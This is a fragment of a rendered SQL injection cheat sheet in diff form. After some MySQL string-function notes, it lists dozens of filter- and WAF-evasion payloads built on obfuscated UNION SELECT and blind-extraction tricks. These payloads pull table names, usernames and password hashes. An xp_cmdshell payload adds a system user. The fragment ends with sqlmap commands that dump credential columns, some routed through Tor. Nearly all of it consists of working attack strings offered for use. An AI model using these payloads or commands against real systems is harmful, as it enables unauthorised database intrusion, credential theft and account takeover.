+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="k">Substring</span><span class="w"> </span><span class="k">search</span><span class="w">
+</span><span class="w"></span><span class="n">locate</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;abc&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">position</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;abc&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">position</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="n">instr</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="n">substring_index</span><span class="p">(</span><span class="s1">&#39;ab&#39;</span><span class="p">,</span><span class="s1">&#39;b&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="n">Split</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="o">#</span><span class="w">
+</span><span class="w"></span><span class="k">length</span><span class="p">(</span><span class="k">trim</span><span class="p">(</span><span class="k">leading</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="s1">&#39;abc&#39;</span><span class="p">))</span><span class="w">
+</span><span class="w"></span><span class="k">length</span><span class="p">(</span><span class="k">replace</span><span class="p">(</span><span class="s1">&#39;abc&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;))
+</span></code></pre></div><div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">###</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">comparison</span><span class="w">
+</span><span class="w"></span><span class="n">strcmp</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">mod</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="n">find_in_set</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="n">field</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">count</span><span class="p">(</span><span class="n">concat</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">))</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="k">length</span><span class="w">
+</span><span class="w"></span><span class="k">length</span><span class="p">()</span><span class="w">
+</span><span class="w"></span><span class="k">bit_length</span><span class="p">()</span><span class="w">
+</span><span class="w"></span><span class="k">char_length</span><span class="p">()</span><span class="w">
+</span><span class="w"></span><span class="k">octet_length</span><span class="p">()</span><span class="w">
+</span><span class="w"></span><span class="n">bit_count</span><span class="p">()</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">Keyword</span><span class="w"> </span><span class="n">filter</span><span class="w">
+</span><span class="w"></span><span class="n">Connected</span><span class="w"> </span><span class="n">keyword</span><span class="w"> </span><span class="n">filtering</span><span class="w">
+</span><span class="w"></span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="k">union</span><span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="k">table_name</span><span class="p">),</span><span class="k">column_name</span><span class="p">,</span><span class="err">…</span><span class="w">
+</span><span class="w"></span><span class="mi">0</span><span class="cm">/**/</span><span class="k">union</span><span class="cm">/*!50000select*/</span><span class="k">table_name</span><span class="o">`</span><span class="n">foo</span><span class="o">`</span><span class="cm">/**/</span><span class="err">…</span><span class="w">
+</span><span class="w"></span><span class="mi">0</span><span class="o">%</span><span class="n">a0union</span><span class="o">%</span><span class="n">a0select</span><span class="o">%</span><span class="mi">09</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">)</span><span class="err">…</span><span class="p">.</span><span class="w">
+</span><span class="w"></span><span class="mi">0</span><span class="err">′</span><span class="k">union</span><span class="w"> </span><span class="k">all</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="k">all</span><span class="o">`</span><span class="k">table_name</span><span class="o">`</span><span class="n">foo</span><span class="w"> </span><span class="k">from</span><span class="o">`</span><span class="n">information_schema</span><span class="o">`</span><span class="p">.</span><span class="w"> </span><span class="o">`</span><span class="n">tables</span><span class="o">`</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="o">###</span><span class="w"> </span><span class="n">Flow</span><span class="w"> </span><span class="n">control</span><span class="w">
+</span><span class="w"></span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">[</span><span class="k">else</span><span class="w"> </span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="k">end</span><span class="w">
+</span><span class="w"></span><span class="k">case</span><span class="w"> </span><span class="k">when</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">then</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="p">[</span><span class="k">else</span><span class="w"> </span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="k">end</span><span class="w">
+</span><span class="w"></span><span class="k">if</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="o">=</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="n">ifnull</span><span class="p">(</span><span class="k">nullif</span><span class="p">(</span><span class="s1">&#39;a&#39;</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span><span class="w"> </span><span class="n">d</span><span class="p">)</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">vector</span><span class="w">
+</span><span class="w"></span><span class="o">%</span><span class="mi">55</span><span class="n">nion</span><span class="p">(</span><span class="o">%</span><span class="mi">53</span><span class="n">elect</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span><span class="c1">-- -
+</span><span class="c1"></span><span class="w"> 
+</span><span class="w"></span><span class="o">+</span><span class="k">union</span><span class="o">+</span><span class="n">distinctROW</span><span class="o">+</span><span class="k">select</span><span class="o">+</span><span class="w">
+</span><span class="w"></span><span class="cm">/**//*!12345UNION SELECT*//**/</span><span class="w">
+</span><span class="w"></span><span class="cm">/**/</span><span class="k">UNION</span><span class="cm">/**//*!50000SELECT*//**/</span><span class="w">
+</span><span class="w"></span><span class="cm">/*!50000UniON SeLeCt*/</span><span class="w">
+</span><span class="w"></span><span class="o">+#</span><span class="k">uNiOn</span><span class="o">+#</span><span class="k">sEleCt</span><span class="w">
+</span><span class="w"></span><span class="o">+#</span><span class="mi">1</span><span class="n">q</span><span class="o">%</span><span class="mi">0</span><span class="n">AuNiOn</span><span class="w"> </span><span class="k">all</span><span class="o">#</span><span class="n">qa</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">#%</span><span class="mi">0</span><span class="n">AsEleCt</span><span class="w">
+</span><span class="w"></span><span class="cm">/*!u%6eion*/</span><span class="w"> </span><span class="cm">/*!se%6cect*/</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="n">un</span><span class="cm">/**/</span><span class="n">ion</span><span class="o">+</span><span class="n">se</span><span class="cm">/**/</span><span class="n">lect</span><span class="w">
+</span><span class="w"></span><span class="n">uni</span><span class="o">%</span><span class="mi">0</span><span class="n">bon</span><span class="o">+</span><span class="n">se</span><span class="o">%</span><span class="mi">0</span><span class="n">blect</span><span class="w">
+</span><span class="w"></span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">**%</span><span class="mi">2</span><span class="n">funion</span><span class="o">%</span><span class="mi">2</span><span class="n">f</span><span class="o">**%</span><span class="mi">2</span><span class="n">fselect</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="o">%</span><span class="mi">23</span><span class="n">foo</span><span class="o">*%</span><span class="mi">2</span><span class="n">F</span><span class="o">*</span><span class="n">bar</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Aselect</span><span class="o">%</span><span class="mi">23</span><span class="n">foo</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="w">
+</span><span class="w"></span><span class="n">REVERSE</span><span class="p">(</span><span class="n">noinu</span><span class="p">)</span><span class="o">+</span><span class="n">REVERSE</span><span class="p">(</span><span class="n">tceles</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="cm">/*--*/</span><span class="k">union</span><span class="cm">/*--*/</span><span class="k">select</span><span class="cm">/*--*/</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="w"> </span><span class="p">(</span><span class="cm">/*!/**/ SeleCT */</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="cm">/*!union*/</span><span class="o">+</span><span class="cm">/*!select*/</span><span class="w">
+</span><span class="w"></span><span class="k">union</span><span class="o">+</span><span class="cm">/*!select*/</span><span class="w">
+</span><span class="w"></span><span class="cm">/**//*!union*//**//*!select*//**/</span><span class="w">
+</span><span class="w"></span><span class="cm">/*!uNIOn*/</span><span class="w"> </span><span class="cm">/*!SelECt*/</span><span class="w">
+</span><span class="w"></span><span class="o">+</span><span class="k">union</span><span class="o">+</span><span class="n">distinctROW</span><span class="o">+</span><span class="k">select</span><span class="o">+</span><span class="w">
+</span><span class="w"></span><span class="o">-</span><span class="mi">15</span><span class="o">+</span><span class="p">(</span><span class="k">uNioN</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="k">sElECt</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="o">-</span><span class="mi">15</span><span class="o">+</span><span class="p">(</span><span class="n">UnI</span><span class="p">)(</span><span class="k">oN</span><span class="p">)</span><span class="o">+</span><span class="p">(</span><span class="n">SeL</span><span class="p">)(</span><span class="n">ecT</span><span class="p">)</span><span class="o">+</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="k">UnIOn</span><span class="cm">/**/</span><span class="k">SeLect</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="n">UNIunionON</span><span class="o">+</span><span class="n">SELselectECT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="cm">/*!UnIOn*/</span><span class="o">+</span><span class="cm">/*!sElEcT*/</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="k">Select</span><span class="w"> </span><span class="mi">0</span><span class="n">xAA</span><span class="w"> </span><span class="mi">1000</span><span class="w"> </span><span class="k">more</span><span class="w"> </span><span class="n">A</span><span class="err">’</span><span class="n">s</span><span class="p">)</span><span class="o">+</span><span class="k">UnIoN</span><span class="o">+</span><span class="k">SeLeCT</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="n">un</span><span class="cm">/**/</span><span class="n">ion</span><span class="o">+</span><span class="n">sel</span><span class="cm">/**/</span><span class="n">ect</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--
+</span><span class="c1"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="cm">/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="w">
+</span><span class="w"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="cm">/**/</span><span class="k">union</span><span class="cm">/*&amp;id=*/</span><span class="k">select</span><span class="cm">/*&amp;id=*/</span><span class="k">column</span><span class="cm">/*&amp;id=*/</span><span class="k">from</span><span class="cm">/*&amp;id=*/</span><span class="k">table</span><span class="c1">--
+</span><span class="c1"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="cm">/**/</span><span class="k">union</span><span class="cm">/*&amp;id=*/</span><span class="k">select</span><span class="cm">/*&amp;id=*/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="c1">--
+</span><span class="c1"></span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="p">(</span><span class="k">Select</span><span class="w"> </span><span class="mi">0</span><span class="n">xAA</span><span class="o">*</span><span class="mi">1000</span><span class="p">)</span><span class="w"> </span><span class="cm">/*!UNION*/</span><span class="w"> </span><span class="cm">/*!SELECT*//**/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="err">—</span><span class="n">x</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="cm">/**/</span><span class="k">union</span><span class="cm">/*&amp;id=*/</span><span class="k">select</span><span class="cm">/*&amp;id=*/</span><span class="k">column</span><span class="cm">/*&amp;id=*/</span><span class="k">from</span><span class="cm">/*&amp;id=*/</span><span class="k">table</span><span class="c1">--
+</span><span class="c1"></span><span class="cm">/*!union*/</span><span class="o">+</span><span class="cm">/*!select*/</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="cm">/*!UnIOn*//*!SeLect*/</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="n">un</span><span class="cm">/**/</span><span class="n">ion</span><span class="o">+</span><span class="n">sel</span><span class="cm">/**/</span><span class="n">ect</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="cm">/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="err">—</span><span class="w">
+</span><span class="w"></span><span class="n">ID</span><span class="o">=</span><span class="mi">66</span><span class="o">+</span><span class="k">UnIoN</span><span class="o">+</span><span class="k">aLL</span><span class="o">+</span><span class="k">SeLeCt</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,(</span><span class="k">SELECT</span><span class="o">+</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">id</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">password</span><span class="p">,</span><span class="mi">0</span><span class="n">x3a</span><span class="p">)</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="o">+</span><span class="k">WHERE</span><span class="o">+</span><span class="n">table_schema</span><span class="o">=</span><span class="mi">0</span><span class="n">x6334706F645F666573746976616C5F636D73</span><span class="o">+</span><span class="k">AND</span><span class="o">+</span><span class="k">table_name</span><span class="o">=</span><span class="mi">0</span><span class="n">x7573657273</span><span class="p">),</span><span class="mi">9</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="mi">12</span><span class="p">,</span><span class="mi">13</span><span class="p">,</span><span class="mi">14</span><span class="p">,</span><span class="mi">15</span><span class="p">,</span><span class="mi">16</span><span class="p">,</span><span class="mi">17</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">19</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">22</span><span class="p">,</span><span class="mi">23</span><span class="p">,</span><span class="mi">24</span><span class="p">,</span><span class="mi">25</span><span class="p">,</span><span class="mi">26</span><span class="p">,</span><span class="mi">27</span><span class="p">,</span><span class="mi">28</span><span class="p">,</span><span class="mi">29</span><span class="p">,</span><span class="mi">30</span><span class="c1">--
+</span><span class="c1"></span><span class="w"> 
+</span><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="k">and</span><span class="o">+</span><span class="n">ascii</span><span class="p">(</span><span class="k">lower</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">pwd</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="k">limit</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)))</span><span class="o">=</span><span class="mi">74</span><span class="w">
+</span><span class="w"></span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">uid</span><span class="o">=</span><span class="n">strcmp</span><span class="p">(</span><span class="k">left</span><span class="p">((</span><span class="k">select</span><span class="o">+</span><span class="n">hash</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">users</span><span class="o">+</span><span class="k">limit</span><span class="o">+</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x42</span><span class="p">)</span><span class="o">+</span><span class="mi">123</span><span class="w">
+</span><span class="w"></span><span class="o">?</span><span class="n">page_id</span><span class="o">=</span><span class="k">null</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="cm">/**//*!50000%55nIOn*//*yoyu*/</span><span class="k">all</span><span class="cm">/**/</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="cm">/*!%53eLEct*/</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="cm">/*nnaa*/</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="w">
+</span><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">15</span><span class="o">+</span><span class="cm">/*!UnIoN*/</span><span class="o">+</span><span class="cm">/*!aLl*/</span><span class="o">+</span><span class="cm">/*!SeLeCt*/</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="c1">--
+</span><span class="c1"></span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="cm">/*!limit+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="n">id</span><span class="o">=-</span><span class="mi">725</span><span class="o">+</span><span class="cm">/*!UNION*/</span><span class="o">+</span><span class="cm">/*!SELECT*/</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">GrOUp_COnCaT</span><span class="p">(</span><span class="k">TABLE_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="cm">/*!INFORMATION_SCHEM*/</span><span class="p">.</span><span class="n">TABLES</span><span class="c1">-- 
+</span><span class="c1"></span><span class="n">id</span><span class="o">=-</span><span class="mi">725</span><span class="o">+</span><span class="cm">/*!UNION*/</span><span class="o">+</span><span class="cm">/*!SELECT*/</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span><span class="n">GrOUp_COnCaT</span><span class="p">(</span><span class="k">COLUMN_NAME</span><span class="p">),</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="o">+</span><span class="k">FROM</span><span class="o">+</span><span class="cm">/*!INFORMATION_SCHEM*/</span><span class="p">.</span><span class="n">COLUMNS</span><span class="o">+</span><span class="k">WHERE</span><span class="o">+</span><span class="k">TABLE_NAME</span><span class="o">=</span><span class="mi">0</span><span class="n">x41646d696e</span><span class="c1">--
+</span><span class="c1"></span><span class="w"> 
+</span><span class="w"></span><span class="k">SELECT</span><span class="o">*</span><span class="k">FROM</span><span class="p">(</span><span class="n">test</span><span class="p">)</span><span class="k">WHERE</span><span class="p">(</span><span class="n">name</span><span class="p">)</span><span class="k">IN</span><span class="p">(</span><span class="n">_ucs2</span><span class="w"> </span><span class="mi">0</span><span class="n">x01df010e004d00cf0148</span><span class="p">);</span><span class="w">
+</span><span class="w"></span><span class="k">SELECT</span><span class="p">(</span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">0</span><span class="n">x3C613E61646D696E3C2F613E</span><span class="p">,</span><span class="mi">0</span><span class="n">x2f61</span><span class="p">))</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="n">xml</span><span class="w"> </span><span class="n">way</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">mid</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="o">=</span><span class="n">unhex</span><span class="p">(</span><span class="s1">&#39;2a&#39;</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">mid</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">regexp</span><span class="w"> </span><span class="s1">&#39;[*]&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">mid</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;*&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">mid</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="n">rlike</span><span class="w"> </span><span class="s1">&#39;[*]&#39;</span><span class="w">
+</span><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">ord</span><span class="p">(</span><span class="n">mid</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">=</span><span class="mi">42</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="o">/?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="o">+</span><span class="k">union</span><span class="o">+</span><span class="p">(</span><span class="k">select</span><span class="s1">&#39;1&#39;</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="n">login</span><span class="p">,</span><span class="n">hash</span><span class="p">)</span><span class="k">from</span><span class="o">+</span><span class="n">users</span><span class="p">)</span><span class="w">
+</span><span class="w"></span><span class="o">/?</span><span class="n">id</span><span class="o">=</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">union</span><span class="p">(((((((</span><span class="k">select</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="n">hex</span><span class="p">(</span><span class="n">hash</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">users</span><span class="p">))))))))</span><span class="w">
+</span><span class="w"> 
+</span><span class="w"></span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39;; /*&amp;id=1*/ EXEC /*&amp;id=1*/ master..xp_cmdshell /*&amp;id=1*/ net user lucifer UrWaFisShiT /*&amp;id=1*/ --
+</span><span class="s1">id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
+</span><span class="s1">id=10 and 1=0/(select top 1 table_name from information_schema.tables)
+</span><span class="s1">id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
+</span><span class="s1">id = -725 + UNION + SELECT + 1, version (), 3,4,5 - sp_password // use request of log hidden sp_password
+</span></code></pre></div><h1 id="sqlmap">SQLMAP</h1>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">sqlmap -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> 
+<span class="o">[</span>eazy scan<span class="o">]</span>
+sqlmap -r request.txt 
+<span class="o">[</span>eazy scan with request file<span class="o">]</span>
+sqlmap -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> --tor --tor-type<span class="o">=</span>SOCKS5 
+<span class="o">[</span>using tor<span class="o">]</span>
+sqlmap -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> --dbs 
+<span class="o">[</span>list all database<span class="o">]</span>
+sqlmap -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> -D site_db --tables
+<span class="o">[</span>list table in db site_db<span class="o">]</span>
+sqlmap -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> -D site_db -T users --columns
+<span class="o">[</span>list collums<span class="o">]</span>
+sqlmap -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> -D site_db -T users -C username,password --dump
+<span class="o">[</span>Dump only selected columns<span class="o">]</span>
+sqlmap -u <span class="s2">&#34;http://testsite.com/login.php&#34;</span> –method <span class="s2">&#34;POST&#34;</span> –data <span class="s2">&#34;username=admin&amp;password=admin&amp;submit=Submit&#34;</span> -D social_mccodes -T users –dump
+<span class="o">[</span>Dump a table from a database when you have admin credentials<span class="o">]</span>
